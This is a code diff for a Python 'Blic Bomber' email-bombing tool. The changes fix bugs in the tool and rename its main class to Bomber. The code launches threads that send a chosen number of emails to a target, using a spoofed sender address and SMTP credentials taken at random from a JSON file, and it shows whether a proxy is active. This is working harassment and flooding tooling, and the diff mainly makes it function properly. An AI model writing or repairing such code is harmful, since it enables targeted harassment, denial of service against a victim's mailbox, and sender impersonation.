@@ -64,9 +64,9 @@ class Stats:
     sent = 0
     failed = 0
 
-class Main:
+class Bomber:
     def __init__(self) -> None:
-        self.cbanner = "\n".join(line.center(center) for line in banner.splitlines())
+        self.cBanner = "\n".join(line.center(center) for line in banner.splitlines())
         self.ioCBanner = "\n".join(line.center(center) for line in ioBanner.splitlines())
         self.cool_graphics()
         self.answers = inquirer.prompt(questions)
@@ -79,7 +79,10 @@ class Main:
 
     def cool_graphics(self) -> None:
         self.clear()
-        kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if proxies() else 'None'}   |   Python Version: {platform.python_version()}")
+        try:
+            kernel(f"Blic Bomber   |   Sent: {Stats.sent}  Failed: {Stats.failed}   |   Proxy: {'Active' if proxies() else 'None'}   |   Python Version: {platform.python_version()}")
+        except:
+            pass
         print(fade.purplepink(self.cBanner))
 
     def bomb(self) -> None:
@@ -108,7 +111,7 @@ class Main:
             msg.attach(MIMEText(random_body, 'plain'))
 
             with open("transcripts/smtps.json", "r") as f:
-                smtp_data = json.loads(f)
+                smtp_data = json.load(f)
 
             service_name = random.choice(list(smtp_data.keys()))
             service_data = smtp_data[service_name]
@@ -126,17 +129,19 @@ class Main:
             server.starttls()
             server.login(smtp_username, smtp_password)
             text = msg.as_string()
-            server.sendmail(from_addr=spoofed_email, to_addrs=Main.target, msg=text)
+            server.sendmail(from_addr=spoofed_email, to_addrs=self.target, msg=text)
             server.quit()
 
         except Exception as e:
             print(f"Error: {e}")
+                   
     def start(self) -> None:
         for _ in range(int(self.amount)):
             try:
                 threading.Thread(target=self.bomb).start()
-            except:
+            except Exception as e:
                 Stats.failed += 1
+                print(e)
 
             time.sleep(int(self.delay))
             Stats.sent += 1  
